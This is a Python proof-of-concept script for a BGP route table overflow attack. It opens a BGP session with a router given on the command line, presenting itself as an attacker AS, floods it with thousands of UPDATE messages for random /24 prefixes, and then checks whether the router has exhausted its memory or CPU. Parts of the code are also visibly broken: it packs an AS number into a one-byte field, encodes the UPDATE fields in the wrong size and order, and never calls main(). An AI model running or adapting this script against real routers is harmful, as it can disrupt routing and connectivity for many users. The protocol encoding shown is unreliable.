#!/usr/bin/env python3
import socket
import struct
import sys
import time
import random

# BGP Message Types
BGP_OPEN = 1
BGP_UPDATE = 2
BGP_NOTIFICATION = 3
BGP_KEEPALIVE = 4

# BGP OPEN Message Fields
BGP_VERSION = 4
MY_AS = 65535  # Attacker AS
HOLD_TIME = 90
BGP_IDENTIFIER = 1  # Arbitrary BGP Identifier
OPT_PARAM_LEN = 0

def craft_bgp_header(msg_type, msg_length):
    """Crafts the BGP fixed header."""
    marker = b'\xff' * 16  # 16 bytes of 0xFF
    return marker + struct.pack('!BH', msg_type, msg_length)

def craft_bgp_open():
    """Crafts a BGP OPEN message."""
    open_body = struct.pack('!BBHIB', BGP_VERSION, MY_AS, HOLD_TIME, BGP_IDENTIFIER, OPT_PARAM_LEN)
    return craft_bgp_header(BGP_OPEN, 19 + len(open_body)) + open_body

def craft_bgp_keepalive():
    """Crafts a BGP KEEPALIVE message."""
    return craft_bgp_header(BGP_KEEPALIVE, 19)

def craft_bgp_update(prefix):
    """Crafts a BGP UPDATE message advertising a single prefix."""
    # UPDATE message structure:
    # - Withdrawn Routes Length (2 bytes)
    # - Withdrawn Routes (variable)
    # - Total Path Attribute Length (2 bytes)
    # - Path Attributes (variable)
    # - NLRI (variable)
    
    withdrawn_routes_len = 0
    withdrawn_routes = b''
    
    # Path Attributes: Next Hop (Attribute Code 3, Length 4, Flags 0x80)
    next_hop = struct.pack('!B', 0) + struct.pack('!B', 3) + struct.pack('!B', 4) + struct.pack('!B', 0x80) + struct.pack('!I', 0)  # Next hop 0.0.0.0
    
    # NLRI: Prefix Length (1 byte) + Prefix (variable)
    prefix_parts = prefix.split('.')
    prefix_bytes = bytes([int(p) for p in prefix_parts])
    prefix_len = 24  # Assuming /24 prefixes
    nlr = struct.pack('!B', prefix_len) + prefix_bytes
    
    update_body = struct.pack('!B', withdrawn_routes_len) + withdrawn_routes + struct.pack('!H', len(next_hop)) + next_hop + nlr
    return craft_bgp_header(BGP_UPDATE, 19 + len(update_body)) + update_body

def send_bgp_message(sock, msg):
    """Sends a BGP message over the socket."""
    sock.sendall(msg)

def receive_bgp_message(sock):
    """Receives a BGP message from the socket."""
    header = sock.recv(19)
    if len(header) < 19:
        return None
    msg_type, msg_length = struct.unpack('!BH', header[16:])
    if msg_length > 19:
        body = sock.recv(msg_length - 19)
        return header + body
    return header

def generate_random_prefix():
    """Generates a random /24 IP prefix."""
    return f"{random.randint(1, 254)}.{random.randint(0, 255)}.{random.randint(0, 255)}.0"

def main():
    if len(sys.argv) != 2:
        print("Usage: python poc_bgp_route_table_overflow.py <target_ip>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = 179  # BGP default port
    
    try:
        # Step 1: Establish TCP connection to target router
        print(f"[*] Connecting to target router at {target_ip}:{target_port}...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        print("[+] TCP connection established.")
        
        # Step 2: Send BGP OPEN message
        print("[*] Sending BGP OPEN message...")
        send_bgp_message(sock, craft_bgp_open())
        
        # Step 3: Receive BGP OPEN message from target
        print("[*] Waiting for BGP OPEN message from target...")
        open_msg = receive_bgp_message(sock)
        if open_msg is None:
            print("[-] Failed to receive BGP OPEN message.")
            sys.exit(1)
        print("[+] BGP OPEN message received.")
        
        # Step 4: Send BGP KEEPALIVE message
        print("[*] Sending BGP KEEPALIVE message...")
        send_bgp_message(sock, craft_bgp_keepalive())
        
        # Step 5: Receive BGP KEEPALIVE message from target
        print("[*] Waiting for BGP KEEPALIVE message from target...")
        keepalive_msg = receive_bgp_message(sock)
        if keepalive_msg is None:
            print("[-] Failed to receive BGP KEEPALIVE message.")
            sys.exit(1)
        print("[+] BGP KEEPALIVE message received. BGP session established.")
        
        # Step 6: Flood target with BGP UPDATE messages
        print("[*] Starting BGP Route Table Overflow attack...")
        num_prefixes = 10000  # Number of prefixes to flood
        for i in range(num_prefixes):
            prefix = generate_random_prefix()
            update_msg = craft_bgp_update(prefix)
            send_bgp_message(sock, update_msg)
            if (i + 1) % 1000 == 0:
                print(f"[+] Sent {i + 1} prefixes...")
            time.sleep(0.01)  # Small delay to simulate realistic traffic
        
        print("[+] Prefix flooding complete.")
        
        # Step 7: Observe outcome
        print("[*] Observing target router behavior...")
        try:
            sock.settimeout(10)  # Set timeout for receiving messages
            response = receive_bgp_message(sock)
            if response:
                msg_type, _ = struct.unpack('!BH', response[16:])
                if msg_type == BGP_NOTIFICATION:
                    print("[!] Target router sent a NOTIFICATION message. BGP session terminated.")
                else:
                    print("[?] Target router sent an unexpected message.")
            else:
                print("[-] No response from target router. Possible memory exhaustion or CPU overload.")
        except socket.timeout:
            print("[-] No response from target router within timeout. Possible memory exhaustion or CPU overload.")
        
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        sock.close()
        print("[*] Connection closed.")

